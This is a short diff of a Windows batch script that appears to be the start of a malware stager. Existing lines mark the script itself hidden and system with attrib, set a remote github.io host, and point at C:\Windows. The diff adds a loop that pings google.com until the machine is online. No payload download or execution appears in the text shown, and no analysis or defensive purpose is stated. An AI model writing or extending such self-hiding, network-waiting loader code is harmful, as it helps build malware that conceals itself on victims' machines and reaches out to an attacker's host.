@@ -1,6 +1,9 @@
 @echo off
 setlocal 
 attrib +s +h +i "%~f0"
+:connectivitycheck
+ping www.google.com -n 1 -w 5000 >NUL
+if errorlevel 1 goto Connectivitycheck
 
 set host=https://cryptedodissey.github.io
 set environment=C:\Windows
